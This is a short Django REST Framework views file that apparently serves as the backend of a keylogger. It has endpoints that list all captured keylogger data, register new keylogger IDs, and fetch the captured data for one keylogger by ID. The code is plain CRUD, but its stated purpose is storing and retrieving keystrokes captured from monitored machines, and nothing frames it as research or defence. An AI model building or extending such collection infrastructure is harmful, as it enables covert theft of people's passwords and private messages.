from django.shortcuts import render
from rest_framework.response import Response
from rest_framework.views import APIView
from django.views import View
from django.http import HttpResponse
from django.db import transaction

from .models import *
from .serializers import *


class GetAllData(APIView):
    def get(self, request, format=None):
        serializer = GetDataSerializer(KeyloggerData.objects.all(), many=True)
        return Response(serializer.data)


class CreateId(APIView):
    @transaction.atomic
    def get(self, request):
        new = KeyloggerID()
        new.save()
        serializer = GetIDSerializer(new)
        return Response(serializer.data)

class GetDataById(APIView):
    def get(self, request, pk):
        serializer = GetDataSerializer(KeyloggerData.objects.filter(keylogger_ref = pk), many=True)
        return Response(serializer.data)